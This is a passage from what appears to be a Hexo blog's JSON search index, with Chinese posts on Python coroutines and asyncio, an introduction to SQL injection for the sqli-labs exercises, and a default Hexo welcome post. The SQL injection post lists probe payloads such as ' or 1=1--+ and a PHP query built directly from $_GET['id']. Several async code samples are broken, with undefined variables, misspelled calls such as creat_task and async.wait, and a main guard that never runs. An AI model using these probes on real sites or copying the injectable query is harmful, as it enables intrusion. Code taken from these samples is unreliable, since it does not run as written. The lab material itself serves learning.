asyncioclass AsyncContextManager: def __init__(self): self.conn = conn async def do_something(self): # 异步操作数据库 return 666 async def __aenter__(self): # 异步连接数据库 self.conn = await asyncio.sleep(2) return self async def __aexit__(self, exc_type, exc, tb): await asyncio.sleep(2)async def func(): async with AsyncContextManager as f: result = await f.do_something() print(result) asyncio.run(func())","categories":[],"tags":[],"author":"Dokey_"},{"title":"异步协程-01","slug":"异步协程-01","date":"2021-06-30T11:13:20.000Z","updated":"2023-03-25T14:35:06.473Z","comments":true,"path":"60828.html","link":"","permalink":"http://example.com/60828.html","excerpt":"","text":"异步协程-class01 协程 asyncio模块进行异步编程 实战案例 1.协程协程不是计算机提供，程序员人为创造。协程（Coroutine），也可以被称为微线程，是一种用户态内的上下文切换的技术，简而言之，其实就是通过一个线程实现代码块相互切换执行。 实现协程的方法: greenlet, 早期模块 yield关键字 asyncio装饰器（py3.4引入） async、await关键字（py3.5）【推荐】 1.1 greenlet实现协程123456789101112131415161718from greenlet import greenletdef func1(): print(1) # 第二步：输出1 gr2.switch() # 第三步：切换到func2 print(2) # 第六步：输出2 gr2.switch() # 第七步：切换到func2 def func2(): print(3) # 第四步：输出3 gr1.switch() # 第五步：切换到func1 print(4) # 第八步：输出4 gr1 = greenlet(func1)gr2 = greenlet(func2)gr1.switch() # 第一步：切换到func1 输出结果 12341324 1.2 yield关键字1234567891011121314def func1(): yield 1 yield from func2() yield 2def func2(): yield 3 yield 4f1 = func1()for item in f1: print(item) 输出结果 12341342 1.3 async、await关键字12345678910111213141516171819import asyncioasync def func1(): print(1) await asyncio.sleep(2) print(2) async def func2(): print(3) await asyncio.sleep(2) print(4) tasks = [ asyncio.ensure_future(func1()), asyncio.ensure_future(func2())]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) __注意：遇到IO阻塞自动切换输出结果 1234513--------停顿24 协程的意义在线程中如果遇到IO等待时间，线程可利用空闲时间干其他的事情 2.1 案例：下载三张图片 普通方式12345678910111213141516171819202122import requestimport timedef download(url): name = url.rsplit(&quot;/&quot;, 1)[1] res = requests.get(url) with open(name, mode=&quot;wb&quot;) as f: f.write(res.content) print(name + &quot;Finish.&quot;)if &quot;__name__&quot; == &quot;__main__&quot;: url_list = [ &quot;https://img-baofun.zhhainiao.com/pcwallpaper_ugc/preview/3760b2031ff41ca0bd80bc7a8a13f7bb_preview.mp4&quot;, &quot;https://img-baofun.zhhainiao.com/market/97ba6b60662ab4f31ef06cdf5a5f8e94_preview.mp4&quot;, &quot;https://wallpaperm.cmcm.com/scene/preview_video/750c4e56cb120056c9d155b63025c564_preview.mp4&quot;] start = time.time() for i in url_list: download(i) stop = time.time() print(stop - start) 协程方式1234567891011121314151617181920212223242526272829import asyncioimport aiohttpimport timeasync def download(session, url): async with session.get(url) as response: content = response.content.read() file_name = url.rsplit(&quot;/&quot;, 1)[1] with open(file_name, mode=&quot;wb&quot;) as f: f.write(content) print(file_name + &quot; &quot; +&quot;done&quot;)async def main(): async with aiohttp.ClientSession as session: url_list = [ &quot;https://img-baofun.zhhainiao.com/pcwallpaper_ugc/preview/3760b2031ff41ca0bd80bc7a8a13f7bb_preview.mp4&quot;, &quot;https://img-baofun.zhhainiao.com/market/97ba6b60662ab4f31ef06cdf5a5f8e94_preview.mp4&quot;, &quot;https://wallpaperm.cmcm.com/scene/preview_video/750c4e56cb120056c9d155b63025c564_preview.mp4&quot;] taaks = [asyncio.creat_task(download(session, url)) for url in url_list] await async.wait(tasks)if &quot;__name__&quot; == &quot;__main__&quot;: start = time.time() loop = asyncio.get_event_loop() loop.run_until_complete(main()) stop = time.time() print(stop - start) done","categories":[],"tags":[],"author":"Dokey_"},{"title":"Sqli Labs-01","slug":"Sqli-Labs-01","date":"2021-03-03T02:38:49.000Z","updated":"2023-03-25T14:35:06.440Z","comments":true,"path":"5706.html","link":"","permalink":"http://example.com/5706.html","excerpt":"","text":"基础知识SQL注入分类基于从服务器接收到的响应 基于错误SQL注入 联合查询的类型 堆查询注射 SQL盲注 基于布尔SQL盲注 基于时间的SQL盲注 基于报错的SQL盲注 基于如何处理输入的SQL查询（数据类型） 基于字符串 数字或整数为基础的 基于程度和顺序的注入（哪里发生了影响） 一阶注入 二阶注入一阶注入是指输入的输入语句对WEB直接产生了影响，出现了结果；二阶注入是指输入提交的语句无法直接对WEB应用程序产生影响，通过对其他的辅助间接对WEB产生危害。 系统函数 version() – MySQL版本 user() – 数据库用户名 database() – 数据库名 @@datadir – 数据库路径 @@version_compile_os – 操作系统版本 字符连接函数 concat(str1,str2,…) – 没有分隔符的连接字符串 concat_ws(separator,str1,str2,…) – 含有分隔符地连接字符串 group_concat(str1,str2,…) – 连接一个组的所有字符串，并以逗号分隔每一条数据三个函数能一次性查出所有信息 一般用于尝试的语句PS: –+可以用#替换，url提交过程中编码后为%23 1234567or 1=1--+&#x27;or 1=1--+&quot;or 1=1--+)or 1=1--+&#x27;)or 1=1--+&quot;)or 1=1--+))or 1=1--+ 一般代码为： 12$id = $_GET[&#x27;id&#x27;];$sql = &quot;SELECT * FROM users WHERE id = &#x27;$id&#x27; LIMIT 0,1&quot;; UNION操作符介绍UNION操作符用于合并两个或多个SELECT语句的结果集。请注意，UNION内部的SELECT语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条SELECT语句中的列顺序必须相同。SQL UNION 语法SELECT column_name(s) FROM table_name1UNIONSELECT column_name(s) FROM table_name2另外，UNION结果集中列名总是等于UNION中的第一个SELECT语句中的列名。","categories":[],"tags":[],"author":"Dokey_"},{"title":"Hello World","slug":"hello-world","date":"2021-02-05T16:22:00.000Z","updated":"2023-03-25T14:35:06.445Z","comments":true,"path":"16107.html","link":"","permalink":"http://example.com/16107.html","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/categories/Windows%E5%86%85%E6%A0%B8/"},{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"},{"name":"Windows API","slug":"Windows-API","permalink":"http://example.com/categories/Windows-API/"},{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/categories/Windows-PE/"},{"name":"Golang","slug":"Golang","permalink":"http://example.com/categories/Golang/"},{"name":"MongoDB","slug":"MongoDB","permalink":"http://example.com/categories/MongoDB/"},{"name":"NodeJS","slug":"NodeJS","permalink":"http://example.com/categories/NodeJS/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/categories/JavaScript/"},{"name":"网络安全","slug":"网络安全","permalink":"http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/tags/Windows%E5%86%85%E6%A0%B8/"},{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"},{"name":"Windows API","slug":"Windows-API","permalink":"http://example.com/tags/Windows-API/"},{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/tags/Windows-PE/"},{"name":"Golang","slug":"Golang","permalink":"http://example.com/tags/Golang/"},{"name":"MongoDB","slug":"MongoDB","permalink":"http://example.com/tags/MongoDB/"},{"name":"NodeJS","slug":"NodeJS","permalink":"http://example.com/tags/NodeJS/"},{"name":"windows Hook","slug":"windows-Hook","permalink":"http://example.com/tags/windows-Hook/"},{"name":"windows Inject","slug":"windows-Inject","permalink":"http://example.com/tags/windows-Inject/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"},{"name":"网络安全","slug":"网络安全","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]}